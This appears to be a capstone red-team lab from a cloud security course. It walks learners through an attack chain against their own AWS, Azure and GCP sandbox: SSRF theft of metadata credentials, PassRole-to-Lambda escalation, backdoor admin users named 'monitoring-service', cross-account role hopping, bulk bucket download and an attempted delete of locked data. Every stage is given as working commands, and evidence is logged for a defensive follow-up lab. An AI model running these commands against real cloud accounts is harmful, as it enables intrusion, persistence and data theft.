# Lab: Build the APT Killchain (Red)

> **Level:** Advanced
> **Prereqs:** Modules 09-01 through 09-11, 13-02
> **Clouds:** AWS · Azure · GCP · OnPrem
> **Duration:** 90–120 minutes
**Authorization scope:** Capstone labs are to be run only against learner-owned sandbox accounts. Placeholder accounts are used throughout. No live attack surfaces.

## Objective

Execute the full APT killchain from [13-03](./red-variant-walkthrough.md) against your sandbox deployed in [13-02](./deploying-the-reference-sandbox.md). At each stage, capture the CloudTrail/Activity Log/Cloud Audit Log entry as evidence and log it to `capstone/red-evidence.jsonl`.

## Prerequisites checklist

- [ ] Sandbox deployed (`terraform apply` completed in 13-02)
- [ ] `aws` / `az` / `gcloud` CLI authenticated to sandbox
- [ ] `cloudfox` installed (https://github.com/BishopFox/cloudfox) or equivalent enumeration tool
- [ ] Python 3.11+ available
- [ ] `capstone/` directory created: `mkdir -p capstone`

---

## Step 0 — Lab scaffolding

```bash
mkdir -p capstone
touch capstone/red-evidence.jsonl

# Set up Python virtual environment (optional but recommended)
python3 -m venv capstone/venv
source capstone/venv/bin/activate
pip install boto3 azure-mgmt-resource google-cloud-storage

# Placeholder: The CI credentials file simulating a "leaked repo."
# In a real exercise, you'd find these; here, you collect them from terraform outputs.
cd sandbox-aws
terraform output -json ci_access_key_id > ../capstone/aws-ci-env.json  # ⚠️ sensitive — do not commit
cd ..
```

---

## Step 1 — Deploy reference sandbox

```bash
# Navigate to your sandbox directory (AWS example)
cd sandbox-aws
cp ../Capstone-APT-Scenario/deploying-the-reference-sandbox.md sandbox-readme.md

terraform init
terraform plan   # review plan — confirm all intentional weaknesses are present
terraform apply -auto-approve

# Capture outputs
terraform output -json > ../capstone/sandbox-outputs.json
cd ..
```

**Expected result:** ~15 resources created. Outputs include EC2 public IP, bucket name, cross-account role ARN, CI access key ID.

**Check:** Run the prowler scan from [13-02](../Capstone-APT-Scenario/deploying-the-reference-sandbox.md) and confirm expected failures appear.

---

## Step 2 — Reconnaissance

**Module 09 ref:** [09-02 Recon, OSINT & Fingerprint](../Red-Team-Offense/recon-osint-and-fingerprint.md)

### AWS recon

```bash
# 2a. Identify the account ID (OSINT)
# If you don't already know your sandbox account ID:
aws sts get-caller-identity --profile capstone-sandbox 2>&1 | grep -oE '[0-9]{12}'

# 2b. Enumerate public bucket
BUCKET=$(cat capstone/sandbox-outputs.json | jq -r '.bucket_name.value')
aws s3 ls s3://${BUCKET} --no-sign-request  # unauthenticated — confirms public

# 2c. cloudfox enumeration (scoped to your sandbox)
cloudfox aws -p capstone-sandbox permissions --principal ci-deployer
# Examine the output — note the AdministratorAccess, PassRole permissions

# 2d. Log evidence
python3 -c "
import json, time
with open('capstone/red-evidence.jsonl', 'a') as f:
    f.write(json.dumps({
        'stage': 'recon',
        'ts': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
        'aws_account': '111111111111',
        'bucket_public': True,
        'tool': 'cloudfox/aws-cli',
        'findings': ['AdministratorAccess on ci-deployer', 'PassRole:* allowed']
    }) + '\n')
"
```

### Azure recon

```bash
# Discover tenant from domain
curl -s "https://login.microsoftonline.com/example-tenant.onmicrosoft.com/.well-known/openid-configuration" | jq '.tenant_region_scope'

# List subscriptions (this will fail unless authenticated — that's the recon phase)
az account list --output table 2>/dev/null || echo "No unauthenticated access — expected for recon phase"
```

### GCP recon

```bash
# Discover project from known naming pattern
gcloud projects describe example-project 2>/dev/null || echo "No unauthenticated access — expected"

# Enumerate public GCS bucket
curl -s "https://storage.googleapis.com/storage/v1/b/capstone-data-example-project" | jq '.acl'
```

---

## Step 3 — Initial Access

**Module 09 ref:** [09-03 Initial Access Vectors](../Red-Team-Offense/initial-access-vectors.md)

Choose **one** path (or attempt both):

### Path A — SSRF → IMDS (recommended for blue detection visibility)

```bash
# 3a. Use the vulnerable web app SSRF endpoint
WEB_IP=$(cat capstone/sandbox-outputs.json | jq -r '.ec2_public_ip.value')

# Fetch IAM role name via SSRF proxy
curl "http://${WEB_IP}:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: "vulnerable-ec2-role"

# Fetch credentials
CREDS=$(curl -s "http://${WEB_IP}:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnerable-ec2-role")

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')

echo "Credential expiry: $(echo $CREDS | jq -r '.Expiration')"

# 3b. Verify foothold
aws sts get-caller-identity
# Expected: { "Arn": "arn:aws:sts::111111111111:assumed-role/vulnerable-ec2-role/i-0abcdef..." }
```

### Path B — Leaked CI credentials

```bash
# 3c. The ci-deployer key was output by terraform
export AWS_ACCESS_KEY_ID=$(cat capstone/aws-ci-env.json | jq -r '.access_key_id')
export AWS_SECRET_ACCESS_KEY=$(cat capstone/aws-ci-env.json | jq -r '.secret_access_key')
unset AWS_SESSION_TOKEN  # IAM user keys don't use session tokens

# Verify
aws sts get-caller-identity
# Expected: { "Arn": "arn:aws:iam::111111111111:user/ci-deployer" }
```

> **Azure Path B:**
> ```bash
> export AZURE_CLIENT_ID=$(cat capstone/sandbox-outputs.json | jq -r '.sp_client_id.value')
> export AZURE_CLIENT_SECRET=$(cat capstone/sandbox-outputs.json | jq -r '.sp_secret.value')
> export AZURE_TENANT_ID="00000000-0000-0000-0000-000000000000"
> az login --service-principal -u $AZURE_CLIENT_ID -p $AZURE_CLIENT_SECRET --tenant $AZURE_TENANT_ID
> ```

> **GCP Path B:**
> ```bash
> gcloud auth activate-service-account \
>   --key-file=$(cat capstone/sandbox-outputs.json | jq -r '.ci_key_file.value')
> ```

### Log evidence (both paths)

```bash
python3 -c "
import json
with open('capstone/red-evidence.jsonl', 'a') as f:
    f.write(json.dumps({
        'stage': 'initial_access',
        'vector': 'ssrf_to_imds' if '$AWS_SESSION_TOKEN' else 'leaked_ci_key',
        'principal': 'vulnerable-ec2-role' if '$AWS_SESSION_TOKEN' else 'ci-deployer',
        'caller_identity_verified': True
    }) + '\n')
"
```

---

## Step 4 — Privilege Escalation

**Module 09 ref:** [09-05 Privilege Escalation Catalogue](../Red-Team-Offense/privilege-escalation-catalogue.md)

### AWS — PassRole → Lambda Escalation

```bash
# 4a. Enumerate current permissions
aws iam list-attached-role-policies --role-name vulnerable-ec2-role
aws iam get-policy-version \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --version-id v1

# You already have AdministratorAccess from Step 3.
# For the exercise: demonstrate the PassRole → Lambda escalation path.
# If using Path B (ci-deployer), assume the vulnerable role first:
# aws sts assume-role --role-arn arn:aws:iam::111111111111:role/vulnerable-ec2-role --role-session-name capstone-step4

# 4b. Create the escalation function
cat > /tmp/escalate.py << 'PYEOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    response = iam.create_access_key(UserName='ci-deployer')
    print(f"Created backup key: {response['AccessKey']['AccessKeyId']}")
    return {'status': 'escalated'}
PYEOF
zip /tmp/escalate.zip /tmp/escalate.py

# 4c. Create Lambda using PassRole to prod admin role
aws lambda create-function \
  --function-name capstone-escalate \
  --runtime python3.11 \
  --role arn:aws:iam::111111111111:role/ProdLambdaExecRole \
  --handler escalate.handler \
  --zip-file fileb:///tmp/escalate.zip \
  --timeout 30

# 4d. Invoke — the function runs with ProdLambdaExecRole (AdministratorAccess)
aws lambda invoke --function-name capstone-escalate /tmp/escalate-output.json
cat /tmp/escalate-output.json
# Expected: {"status": "escalated"}

# 4e. The Lambda created a new access key on ci-deployer
# List keys to confirm:
aws iam list-access-keys --user-name ci-deployer
# Expected: 2 keys (1 original + 1 backup created by Lambda)
```

### Azure escalation

```bash
# Elevate the compromised SP to Owner on the subscription
az role assignment create \
  --assignee <ci-sp-object-id> \
  --role Owner \
  --scope /subscriptions/00000000-0000-0000-0000-000000000000
az role assignment list --assignee <ci-sp-object-id> --output table
```

### GCP escalation

```bash
# The prod-func-sa has roles/iam.serviceAccountTokenCreator
# Impersonate ci-deployer (Owner) from the function SA context
gcloud iam service-accounts get-iam-policy \
  ci-deployer@example-project.iam.gserviceaccount.com

# Create key for ci-deployer (this is the escalation)
gcloud iam service-accounts keys create /tmp/escalated-key.json \
  --iam-account=ci-deployer@example-project.iam.gserviceaccount.com

# Activate as Owner
gcloud auth activate-service-account --key-file=/tmp/escalated-key.json
gcloud projects get-iam-policy example-project
```

### Log evidence

```bash
python3 -c "
import json
with open('capstone/red-evidence.jsonl', 'a') as f:
    f.write(json.dumps({
        'stage': 'privilege_escalation',
        'technique': 'PassRole->Lambda' if '<aws>' else 'SA_tokenCreator' if '<gcp>' else 'role_elevation',
        'lambda_created': 'capstone-escalate',
        'backup_key_created': True,
        'escalation_confirmed': True
    }) + '\n')
"
```

---

## Step 5 — Persistence

**Module 09 ref:** [09-07 Persistence Techniques in Cloud](../Red-Team-Offense/persistence-techniques-in-cloud.md)

### AWS

```bash
# 5a. Create a phoenix IAM user (looks legitimate)
aws iam create-user --user-name monitoring-service
aws iam create-access-key --user-name monitoring-service
aws iam attach-user-policy \
  --user-name monitoring-service \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 5b. Store the phoenix credentials for later use
aws iam list-access-keys --user-name monitoring-service > capstone/phoenix-keys.json

# 5c. Lambda persistence — event source mapping
# (Uses a DynamoDB stream — learner creates the table first)
aws dynamodb create-table \
  --table-name capstone-data \
  --attribute-definitions AttributeName=id,AttributeType=S \
  --key-schema AttributeName=id,KeyType=HASH \
  --billing-mode PAY_PER_REQUEST \
  --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES

STREAM_ARN=$(aws dynamodb describe-table --table-name capstone-data --query 'Table.LatestStreamArn' --output text)

aws lambda create-event-source-mapping \
  --function-name capstone-escalate \
  --event-source-arn $STREAM_ARN \
  --enabled \
  --starting-position LATEST
```

### Azure

```bash
# Create a backdoor SP
az ad sp create-for-rbac --name monitoring-service --role Owner --scopes /subscriptions/00000000-0000-0000-0000-000000000000

# Store backdoor credentials
az ad sp credential list --id <monitoring-sp-app-id> > capstone/phoenix-creds.json
```

### GCP

```bash
# Create phoenix SA
gcloud iam service-accounts create monitoring-service --display-name "Monitoring Service"
gcloud projects add-iam-policy-binding example-project \
  --member="serviceAccount:monitoring-service@example-project.iam.gserviceaccount.com" \
  --role="roles/owner"
gcloud iam service-accounts keys create capstone/phoenix-key.json \
  --iam-account=monitoring-service@example-project.iam.gserviceaccount.com
```

### Log evidence

```bash
python3 -c "
import json
with open('capstone/red-evidence.jsonl', 'a') as f:
    f.write(json.dumps({
        'stage': 'persistence',
        'technique': 'create_phoenix_user',
        'principal_name': 'monitoring-service',
        'admin_access_granted': True,
        'lambda_trigger_persisted': True if '<aws>' else False
    }) + '\n')
"
```

---

## Step 6 — Lateral Movement

**Module 09 ref:** [09-06 Lateral Movement & Pivoting](../Red-Team-Offense/lateral-movement-and-pivoting.md)

### AWS — AssumeRole chain through 3 accounts

```bash
# 6a. First hop: Prod → SharedServices
SHARED_ROLE=$(cat capstone/sandbox-outputs.json | jq -r '.cross_account_role_arn.value')
STS1=$(aws sts assume-role \
  --role-arn $SHARED_ROLE \
  --role-session-name capstone-hop1)

export AWS_ACCESS_KEY_ID=$(echo $STS1 | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $STS1 | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $STS1 | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
# Expected: arn:aws:sts::333333333333:assumed-role/CrossAccountRole-SharedServices/capstone-hop1

# 6b. Second hop: SharedServices → Staging (222222222222)
# (Learner: if your sandbox has the second account, populate the role ARN)
# aws sts assume-role --role-arn arn:aws:iam::222222222222:role/StagingDeployRole --role-session-name capstone-hop2

# 6c. Third hop: Return to Prod via different role
# aws sts assume-role --role-arn arn:aws:iam::111111111111:role/ProdSupportRole --role-session-name capstone-hop3
```

> **Note:** If your sandbox has only one account, the cross-account AssumeRole demonstration uses the role with `"Principal": {"AWS": "*"}` as the "cross-account" hop — the broad trust policy is the vulnerability, regardless of whether the second account physically exists. The detection rules in the detection pack look for the broad trust pattern, not necessarily multi-account geometry.

### Azure

```bash
# Cross-subscription movement (requires second subscription in sandbox)
az account set --subscription 00000000-0000-0000-0000-000000000001
az role assignment list --subscription 00000000-0000-0000-0000-000000000002 --assignee <sp-id>
```

### GCP

```bash
# Cross-project AssumeRole equivalent — impersonate SA from different project
gcloud config set project shared-services-project
gcloud auth activate-service-account \
  --key-file=<(gcloud iam service-accounts keys create /dev/stdout \
    --iam-account=sa-shared@shared-services-project.iam.gserviceaccount.com)
```

### Log evidence

```bash
python3 -c "
import json
with open('capstone/red-evidence.jsonl', 'a') as f:
    f.write(json.dumps({
        'stage': 'lateral_movement',
        'technique': 'assume_role_chain',
        'hops': ['111111111111:vulnerable-ec2-role', '333333333333:CrossAccountRole-SharedServices'],
        'broad_trust_exploited': True
    }) + '\n')
"
```

---

## Step 7 — Collection / Exfiltration (Local Staging Only)

**Module 09 ref:** [09-09 Collection & Data Exfil Channels](../Red-Team-Offense/collection-data-exfil-channels.md)

> **CRITICAL:** The capstone *does not* exfiltrate data to the internet. All collected data is staged to `localhost:9000` or a local directory.

```bash
# 7a. List all objects (enumeration for staging)
BUCKET=$(cat capstone/sandbox-outputs.json | jq -r '.bucket_name.value')
aws s3 ls s3://${BUCKET} --recursive

# 7b. Download all objects to local staging
mkdir -p /tmp/capstone-exfil
aws s3 sync s3://${BUCKET} /tmp/capstone-exfil/

# 7c. Simulate exfiltration by writing to localhost artifact
# This is a STAGING step only — no data leaves your machine
python3 -m http.server 9000 --directory /tmp/capstone-exfil &
echo "Exfil staged locally — no internet egress. Kill with: kill %1"

# 7d. Log the "exfil" as local-only artifact
python3 -c "
import json, os
total_bytes = sum(os.path.getsize(os.path.join(dp, f)) for dp, dn, fn in os.walk('/tmp/capstone-exfil') for f in fn)
with open('capstone/red-evidence.jsonl', 'a') as f:
    f.write(json.dumps({
        'stage': 'collection_exfil',
        'destination': 'localhost:9000',
        'bytes_staged': total_bytes,
        'exfil_to_internet': False,
        'method': 's3_sync_to_local'
    }) + '\n')
"
```

### Azure

```bash
az storage blob download-batch --destination /tmp/capstone-exfil \
  --source public-data --account-name capstonedataXXXX
```

### GCP

```bash
gsutil -m cp -r gs://capstone-data-example-project/ /tmp/capstone-exfil/
```

---

## Step 8 — Impact (Attempted Destruction on WORM-protected data)

**Module 09 ref:** [09-09 Collection & Data Exfil Channels](../Red-Team-Offense/collection-data-exfil-channels.md)

```bash
# 8a. Attempt to delete the WORM-protected object
aws s3 rm s3://${BUCKET}/customer-data/records.json
# Expected: AccessDenied error

# 8b. Verify the object still exists (WORM preserved it)
aws s3 ls s3://${BUCKET}/customer-data/records.json
# Expected: object still listed

# Azure
az storage blob delete --account-name capstonedataXXXX \
  --container-name immutable-records --name records.json
# Expected: (403) Operation not permitted — blob is immutably locked

# GCP
gsutil rm gs://capstone-worm-example-project/customer-data/records.json
# Expected: AccessDeniedException — under retention policy
```

### Log evidence

```bash
python3 -c "
import json
with open('capstone/red-evidence.jsonl', 'a') as f:
    f.write(json.dumps({
        'stage': 'impact',
        'action': 'DeleteObject_on_WORM',
        'result': 'AccessDenied',
        'worm_preserved': True,
        'signal_value': 'HIGH — denied API call on WORM is high-confidence detection'
    }) + '\n')
"
```

---

## Step 9 — Capture CloudTrail entries per stage

After completing all stages, extract the corresponding CloudTrail entries from your sandbox:

```bash
# Wait 5–10 minutes for CloudTrail delivery
sleep 600

# Look up each stage's events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateFunction \
  --start-time "2025-01-01T00:00:00Z" \
  --end-time "2025-01-02T00:00:00Z" \
  --output json > capstone/cloudtrail-createfunction.json

aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --start-time "2025-01-01T00:00:00Z" \
  --end-time "2025-01-02T00:00:00Z" \
  --output json > capstone/cloudtrail-createaccesskey.json

aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --start-time "2025-01-01T00:00:00Z" \
  --end-time "2025-01-02T00:00:00Z" \
  --output json > capstone/cloudtrail-assumerole.json

echo "CloudTrail evidence captured in capstone/cloudtrail-*.json"
```

### Azure Activity Log capture

```bash
az monitor activity-log list \
  --start-time "2025-01-01T00:00:00Z" \
  --end-time "2025-01-02T00:00:00Z" \
  --output json > capstone/azure-activity-log.json
```

### GCP Cloud Audit Log capture

```bash
gcloud logging read 'timestamp >= "2025-01-01T00:00:00Z" AND timestamp <= "2025-01-02T00:00:00Z"' \
  --project=example-project --format=json > capstone/gcp-audit-log.json
```

---

## Step 10 — Verify red-evidence.jsonl

```bash
cat capstone/red-evidence.jsonl | python3 -m json.tool
```

Expected stages present:
1. `recon`
2. `initial_access`
3. `privilege_escalation`
4. `persistence`
5. `lateral_movement`
6. `collection_exfil` (local only)
7. `impact`

---

## Teardown

**Do not skip this step.** The sandbox contains real cloud resources that could incur costs if left running.

```bash
# AWS
cd sandbox-aws
terraform destroy -auto-approve
cd ..

# Azure
cd sandbox-azure
terraform destroy -auto-approve
cd ..

# GCP
cd sandbox-gcp
terraform destroy -auto-approve
cd ..

# Clean up local artifacts
rm -rf /tmp/capstone-exfil
# Keep capstone/red-evidence.jsonl for the blue lab and post-incident report
```

## References

- [13-03 — Red Variant Walkthrough](../Capstone-APT-Scenario/red-variant-walkthrough.md)
- [13-02 — Deploying the Reference Sandbox](../Capstone-APT-Scenario/deploying-the-reference-sandbox.md)
- [Module 09 — Red Team Offense](../Red-Team-Offense/README.md)
- [Module 06 — Monitoring & Detection](../Monitoring-Detection-SIEM/README.md)
